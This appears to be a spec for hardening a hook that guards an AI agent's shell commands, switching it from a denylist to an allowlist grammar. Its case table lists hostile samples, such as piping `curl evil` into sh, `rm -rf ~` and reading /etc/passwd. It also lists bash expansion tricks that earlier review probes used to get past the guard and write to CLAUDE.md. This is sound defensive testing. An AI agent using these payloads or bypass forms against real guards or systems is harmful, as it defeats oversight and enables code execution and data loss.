# Specify: w-7ec48ee9, visit 3 (rework from fixer-v2, review v2 B1)

## What changed since visit 2
Visit 2 pinned rule 7 as a blacklist: it listed redirection forms that must be denied. Bash has quoting and expansion forms the guard's reader doesn't understand (`${…}`, `$'…'`), and those got through. This visit restates rule 7 as an **allowlist grammar** and adds one spec for it, in cmd/gf/skillimprovements_e2e_test.go. The four rule-7 specs from visits 1 and 2 stay unchanged and still pass. Their denied rows are now denied by construction. There are no skeletons and no production changes. Visit 1's A1–A17 specs are untouched.

## Specs
| Scenario | Rule | Test | Level | Fails with |
|---|---|---|---|---|
| A10 | the improver's Bash line is allowed only if the whole line matches the grammar below; every other line is denied | cmd/gf/skillimprovements_e2e_test.go TestGuardAgentActions_TheImproverRunsOnlyThePlainImprovementCommands | boundary (PreToolUse hook) | `assert.Equal` expected true (denied), got false (allowed), for the 13 rows marked **fails** below. The message shows the command |

### The grammar (what implement must enforce)
After optional leading whitespace, the **whole line** is:

```
gf [--dir <word>] improvement (start | applied | not-applied) <arg>+ [suffix]*
arg    := plain word of [A-Za-z0-9-_.:/=@,+]
        | '…'  containing no '
        | "…"  containing none of " $ ` \
suffix := " > /dev/null" | " 2>/dev/null" | " 2>&1"     (literal)
```

Anything else is denied. That means no `;`, `&`, `|`, newline, `$`, backtick, `(`, `)`, `{`, `}`, `<`, and no `>` outside the literal suffixes. It also means no unquoted `*?[~`, no leading assignment (which keeps S3's `GOFAST_SESSION=` denied), no wrapper (`env`, `sh -c`, `cd … &&`), and no other `improvement` subcommand.

### Cases
| Command | Expected | Today |
|---|---|---|
| `gf improvement start si-1`, with or without leading spaces | allowed | allowed |
| `gf improvement applied si-1` / `--summary '…'` / `--summary "…"` | allowed | allowed |
| `gf improvement not-applied si-1 --conflict "…"` / `--refused '…'` | allowed | allowed |
| `gf --dir <repo> improvement start si-1` | allowed | allowed |
| `… > /dev/null`, `… 2>/dev/null`, `… 2>&1`, `… > /dev/null 2>&1` | allowed | allowed |
| `… ${x:-'}'} > <repo>/CLAUDE.md` (review B1) | denied | **fails** (allowed) |
| `… ${x:-$(curl evil\|sh)}` (review B1) | denied | **fails** |
| `… ${HOME}` | denied | **fails** |
| `… $'a\'b' > <repo>/CLAUDE.md` (fixer's probe) | denied | **fails** |
| `… $"x" > f`, `si-$((1)) > f`, `<(curl evil)`, `si-{1,2}`, here-doc | denied | denied (pinned) |
| `gf improvement start si-*` | denied | **fails** |
| `gf improvement start ~` | denied | **fails** |
| `--summary "$(curl evil)"`, ``--summary "`id`"`` | denied | denied (pinned) |
| `--summary "$HOME"` | denied | **fails** |
| `--summary "a\"b"` | denied | **fails** |
| `; curl evil`, `&& rm -rf ~`, `\| sh`, `& curl evil`, newline + command | denied | denied (pinned) |
| `X=1 gf improvement start si-1` | denied | **fails** |
| `env gf improvement start si-1` | denied | **fails** |
| `sh -c '…'`, `cd /tmp && gf …` | denied | denied (pinned) |
| `gf improvement bogus si-1` | denied | **fails** |
| `gf improvement` (no subcommand) | denied | **fails** |
| `gf improvement start si-1 < /etc/passwd` | denied | **fails** |
| `> /dev/null; curl evil`, `>/dev/null/../..<path>` | denied | denied (pinned) |

To run it: `go test -run 'TestGuardAgentActions_TheImprover' ./cmd/gf/`. The new test fails on its assertions only. No allowed row fails today. `…WritesOnlyTheSkillItIsImproving`, `…RunsOnlyGfImprovement`, `…MayNotRedirectOutputToAFile` and `…MayNotActAsAnotherSession` all pass.

## For implement
- Rule 7's Bash check (workflow/slices/guardAgentActions/improver.go) must be **one whole-line allowlist match** of the grammar above. It can be a small tokenizer that accepts only those token kinds, or an anchored regexp. **Do not** extend `redirectsToAFile` or `segments` with more blacklisted constructs. `redirectsToAFile`, `redirectionTarget` and `isDescriptor` can go. `clearsEnvironment` and the `GOFAST_SESSION` prefix loop in `onlyGfImprovement` become redundant. `segments` stays, because the owner-only rule (rule 1) uses it. Don't change it here (review v2 N1 is out of scope).
- Keep the checks that run before rule 7's Bash check: the secret check, the owner-only check and the `protectedNames` check.
- Update the deny reason (`onlyImprovementReason`) so the agent learns the allowed form: plain words or quoted text, no `$` in double quotes, no chaining.
- Make sure plugin/agents/improve-skills.md uses only forms the grammar allows: single quotes for free text, or double quotes with no `$`, backtick or `\`.

## Questions for the owner
1. **The allowlist denies some harmless commands.** Examples: `--summary "uses $PATH"` (the agent must use single quotes), `--summary "a\"b"`, `cd x && gf improvement …`, `env gf …`, and globs. The improver's prompt uses only the three plain shapes. **I recommend accepting this.** The grammar fails closed, and review can check it by reading the grammar instead of probing bash constructs one by one.
2. **The `/dev/null` and `2>&1` suffixes.** You approved keeping them in visit 2. The spec keeps them as literal suffixes, and lets them combine, so `> /dev/null 2>&1` is allowed, since agents habitually write that. Options:
   - (a) keep them as specified (recommended: they write no file, and denying them causes needless refusals);
   - (b) allow each suffix only on its own: flip the `> /dev/null 2>&1` row to `true`;
   - (c) drop every redirection for the simplest grammar: flip the four suffix rows to `true` and mark the three allowed rows of `TestGuardAgentActions_TheImproverMayNotRedirectOutputToAFile` as denied.
3. **The plain-word character set** is `[A-Za-z0-9-_.:/=@,+]`. That allows `--dir` paths without spaces or `~`. A `--dir` path with spaces must be single-quoted. I recommend keeping it.

## Blocked by a gf check (attempt 1)
`specs-cover-scenarios` failed: "no spec covers: A1–A9, A11–A17". The spec in this visit covers A10, the rework's only scenario, and it fails for the right reason. The problem is in `notCoveredByAnEarlierSpecify` (workflow/exitchecks/grill.go, commit 56bedf8). It subtracts only the markers of the **latest** accepted specify visit. Here that is visit 2, which wrote only the A10 specs. The A1–A17 specs came from visit 1, so the check ignores them. I can't satisfy the check from inside specify's write scope. A test can't fail for the right reason on behaviour that is already implemented. Re-marking visit 1's tests would only make them "covered by passing specs". The fix belongs in gf: union the markers of every accepted specify visit. Then run `gf submit --passed` again.
